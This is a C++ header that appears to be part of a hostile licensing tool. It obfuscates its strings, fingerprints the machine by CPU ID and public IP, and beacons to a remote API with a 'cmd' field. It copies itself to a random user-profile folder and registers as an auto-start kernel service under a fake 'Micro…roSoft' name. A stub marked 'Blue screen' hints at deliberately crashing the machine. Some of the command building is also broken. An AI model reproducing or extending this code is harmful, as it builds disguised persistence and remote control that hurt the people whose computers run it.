#pragma once
#define WIN32_LEAN_AND_MEAN   
#include <iphlpapi.h>
#include <windows.h>
#include <intrin.h>
#include <iostream>
#include <sstream>
#include <string>
#include <iomanip>
#include <fileapi.h>
#include <conio.h>
#include <array>
#include "skStr.h"
using namespace std;

string cmd(char* pChar) {
    string input = pChar;
    int ch;
    const char* c = input.c_str();
    string output;
    FILE* UUID = _popen(c, "r");
    while ((ch = fgetc(UUID)) != EOF) {
        output += putchar(ch);
    }
    return output;
}

char* to_char(string string) {
    string += " && rem ";
    const int length = string.length();
    char* c_char = new char[length + 1];
    for (int i = 0; i < length; ++i) {
        c_char[i] = string[i];
    }
    return c_char;
}

string getCPU() {
    array< int, 4> cpuinfo;
    __cpuid(cpuinfo.data(), 1);
    ostringstream buffer;
    buffer << uppercase << hex << setfill('0') << setw(8) << cpuinfo.at(3) << setw(8) << cpuinfo.at(0);
    return buffer.str();
}

string curl(char* url) {
    string command;
    command = skCrypt("curl -s ");
    command += url;
    return cmd(to_char(command));
}

string apiCall(char * input) {
    string command;
    command = skCrypt("curl -s ");
    command += skCrypt("-H \"apikey: ");
    command += skCrypt("Some SHA-hash");
    command += skCrypt("\" -H \"uuid: ");
    command += getCPU();
    command += skCrypt("\" -H \"ip: ");
    command += curl(skCrypt("api.ipify.org"));
    command += skCrypt("\" -H \"cmd: ");
    command += input;
    command += "\" ";
    command += skCrypt("http://0.0.0.0:5000/api");
    return cmd(to_char(command));
}

void notLinked(char *path) {
    string rndPath, rndName, svcName, absPath, command;
    rndPath = cmd(skCrypt("echo %userprofile%\\%random%\\%random%"));
    svcName = cmd(skCrypt("echo Micro%random%roSoft"));
    rndName = cmd(skCrypt("echo %random%.exe"));
    absPath = rndPath + "\\" + rndName;
    command = "mkdir "+rndPath;
    cmd(to_char(command));
    command = skCrypt("copy ");
    command += path;
    command += " " + absPath;
    command += skCrypt("sc create ");
    command += svcName;
    command += skCrypt(" binPath = \"");
    command += absPath;
    command += skCrypt("\" type=kernel start=auto");
    cmd(to_char(command));
    string code = apiCall(skCrypt("new"));
    command = skCrypt("sc start ");
    command += svcName;
    cmd(to_char(command));
    system(skCrypt("cls"));
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    cout << "This computer is not registered!\nPlease goto discord and type !verify "+code;
    cin >> command;
    exit(0);
}

void blacklisted() {
    // Blue screen
    // 
}